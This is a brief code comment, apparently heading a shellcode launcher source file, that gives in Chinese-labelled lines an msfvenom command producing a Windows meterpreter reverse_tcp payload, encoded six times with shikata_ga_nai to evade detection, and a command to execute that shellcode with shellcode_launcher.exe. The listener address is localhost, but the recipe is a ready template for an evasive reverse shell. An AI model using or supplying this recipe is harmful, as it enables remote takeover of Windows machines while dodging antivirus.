/*
// github: https://github.com/clinicallyinane/shellcode_launcher
// 生成: msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=127.0.0.1 lport=3333  -f raw -o shellcode.raw
// 使用: shellcode_launcher.exe -i shellcode.raw
 */
